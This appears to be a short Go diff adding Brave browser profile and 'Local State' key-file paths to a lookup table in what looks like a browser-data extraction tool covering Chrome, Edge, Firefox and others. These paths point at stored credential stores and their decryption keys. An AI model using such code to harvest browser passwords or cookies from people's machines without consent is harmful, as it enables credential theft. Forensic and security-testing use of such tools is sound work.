@@ -15,6 +15,8 @@ const (
 	chromeKeyPath        = "/AppData/Local/Google/Chrome/User Data/Local State"
 	edgeProfilePath      = "/AppData/Local/Microsoft/Edge/User Data/*/"
 	edgeKeyPath          = "/AppData/Local/Microsoft/Edge/User Data/Local State"
+	braveProfilePath     = "/AppData/Local/BraveSoftware/Brave-Browser/User Data/*/"
+	braveKeyPath         = "/AppData/Local/BraveSoftware/Brave-Browser/User Data/Local State"
 	speed360ProfilePath  = "/AppData/Local/360chrome/Chrome/User Data/*/"
 	speed360KeyPath      = ""
 	qqBrowserProfilePath = "/AppData/Local/Tencent/QQBrowser/User Data/*/"
@@ -57,6 +59,12 @@ var (
 			ProfilePath: os.Getenv("USERPROFILE") + firefoxProfilePath,
 			Name:        firefoxName,
 			New:         NewFirefox,
+		},
+		"brave": {
+			ProfilePath: os.Getenv("USERPROFILE") + braveProfilePath,
+			KeyPath:     os.Getenv("USERPROFILE") + braveKeyPath,
+			Name:        braveName,
+			New:         NewChromium,
 		},
 	}
 )
